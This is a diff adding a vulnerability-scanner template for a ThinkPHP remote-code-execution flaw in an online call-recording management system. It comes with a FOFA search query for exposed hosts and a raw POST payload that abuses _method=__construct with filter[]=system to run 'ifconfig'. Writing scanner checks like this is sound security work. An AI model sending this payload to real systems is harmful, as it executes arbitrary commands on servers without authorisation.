@@ -1,0 +1,27 @@
+id: shenoutx-Thinkphp-rce
+info:
+  name: shenoutx-Thinkphp-rce
+  author: lengmo
+  severity: high
+  description: shenoutx-Thinkphp-rce。
+  tags: rce
+  metadata:
+    fofa-query: title="在线录音管理系统"
+http:
+  - raw:
+      - |
+        POST /callcenter/public/index.php/index.php?s=index/index/index HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        s=ifconfig&_method=__construct&method=POST&filter[]=system
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'eth0:'
+      - type: status
+        status: 
+          - 302
